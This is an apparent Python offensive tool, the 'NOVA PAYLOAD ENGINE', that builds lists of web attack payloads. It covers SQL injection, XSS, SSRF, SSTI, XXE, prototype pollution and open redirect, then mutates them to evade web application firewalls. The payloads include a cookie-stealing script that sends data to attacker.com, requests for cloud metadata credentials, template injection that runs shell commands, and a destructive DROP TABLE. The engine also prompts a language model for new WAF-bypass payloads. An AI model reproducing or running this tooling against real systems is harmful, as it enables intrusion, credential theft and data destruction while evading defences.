#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  💣 NOVA PAYLOAD ENGINE v1.0 — Polymorphic Payload Generator   ║
║                                                                  ║
║  Generates, mutates, and evolves attack payloads for:           ║
║    • SQL Injection (error-based, blind, time-based, union)      ║
║    • XSS (reflected, stored, DOM, polyglot)                     ║
║    • SSRF, SSTI, XXE, prototype pollution, open redirect        ║
║                                                                  ║
║  Integrates with LLM reasoning for WAF-bypass mutations.        ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
    from nova_payload_engine import NovaPayloadEngine

    engine = NovaPayloadEngine()
    payloads = engine.generate("sql_injection", count=10, waf_mode=True)
"""

import random
import string
from typing import Any, Dict, List, Optional

# ── Static payload libraries ──────────────────────────────────────────────────

_SQLI_BASE: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 OR 1=1",
    "' OR ''='",
]

_XSS_BASE: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(document.cookie)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\"autofocus onfocus=alert(1) \"",
    "<details open ontoggle=alert(1)>",
    "--><script>alert(1)</script>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

_SSRF_BASE: List[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::1]/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "file:///etc/passwd",
    "dict://localhost:11211/",
    "gopher://localhost:25/_EHLO%20localhost",
]

_SSTI_BASE: List[str] = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "{{self.__dict__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "<%= 7*7 %>",
    "{{request.environ['SERVER_NAME']}}",
    "{%for i in range(1)%}{{i}}{%endfor%}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
]

_XXE_BASE: List[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><test/>',
]

_PROTO_POLLUTION: List[str] = [
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"polluted": "yes"}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    '__proto__[isAdmin]=true',
    'constructor[prototype][isAdmin]=true',
]

_OPEN_REDIRECT: List[str] = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F..",
    "/\\evil.com",
    "javascript:alert(1)",
    "https://evil.com@trusted.com",
    "https://trusted.com.evil.com",
    "%2F%2Fevil.com",
]

_PAYLOAD_MAP: Dict[str, List[str]] = {
    "sql_injection":      _SQLI_BASE,
    "sqli":               _SQLI_BASE,
    "xss":                _XSS_BASE,
    "xss_reflected":      _XSS_BASE,
    "xss_stored":         _XSS_BASE,
    "ssrf":               _SSRF_BASE,
    "ssti":               _SSTI_BASE,
    "xxe":                _XXE_BASE,
    "prototype_pollution": _PROTO_POLLUTION,
    "open_redirect":      _OPEN_REDIRECT,
    "rce":                [],
    "reverse_shells":     [],
    "web_shells":         [],
}


# ── Mutation helpers ──────────────────────────────────────────────────────────

def _waf_mutate(payload: str) -> str:
    """Apply a random WAF-bypass mutation to a payload."""
    mutations = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "%20"),
        lambda p: p.replace("'", "%27"),
        lambda p: p.replace("<", "%3C").replace(">", "%3E"),
        lambda p: p.upper(),
        lambda p: p.replace("SELECT", "SeLeCt"),
        lambda p: p.replace("OR", "||"),
        lambda p: p.replace("AND", "&&"),
        lambda p: p,  # identity (keep original)
    ]
    return random.choice(mutations)(payload)


def _add_noise(payload: str) -> str:
    """Append a random comment / padding to make payload unique."""
    noise = "".join(random.choices(string.ascii_lowercase, k=4))
    return payload + f"/* {noise} */"


# ── Engine ────────────────────────────────────────────────────────────────────

from nova_payload_library import get_payloads

class NovaPayloadEngine:
    """
    Polymorphic payload generator.
    Optionally uses an LLM reasoning core to produce novel bypass variants.
    """

    def __init__(self, reasoning: Any = None):
        self._reasoning = reasoning
        self.library = get_payloads

    def generate(self, vuln_type: str, count: int = 10,
                 waf_mode: bool = False) -> List[str]:
        """
        Return `count` payloads for the given vulnerability type.
        If waf_mode=True, each payload is mutated for WAF evasion.
        """
        # Pull from centralized library if available
        lib_payloads = self.library(vuln_type)
        if lib_payloads:
            base = lib_payloads
        else:
            base = _PAYLOAD_MAP.get(vuln_type.lower(), _SQLI_BASE)
            
        pool = list(base)

        # Extend with mutations
        if waf_mode:
            pool.extend([_waf_mutate(p) for p in base])
            pool.extend([_add_noise(p) for p in base[:5]])

        # LLM-augmented payloads (best-effort)
        if self._reasoning and hasattr(self._reasoning, "think"):
            try:
                prompt = (
                    f"Generate 3 advanced {vuln_type} payloads that bypass modern WAFs. "
                    "Output only the payloads, one per line, no explanation."
                )
                result = self._reasoning.think(prompt, max_tokens=200)
                if result:
                    llm_payloads = [l.strip() for l in result.strip().splitlines()
                                    if l.strip()][:3]
                    pool.extend(llm_payloads)
            except Exception:
                pass

        random.shuffle(pool)
        return pool[:count]

    def all_types(self) -> List[str]:
        return list(_PAYLOAD_MAP.keys())


if __name__ == "__main__":
    engine = NovaPayloadEngine()
    for vtype in ["sql_injection", "xss", "ssrf"]:
        payloads = engine.generate(vtype, count=3, waf_mode=True)
        print(f"\n{vtype}:")
        for p in payloads:
            print(f"  {p}")
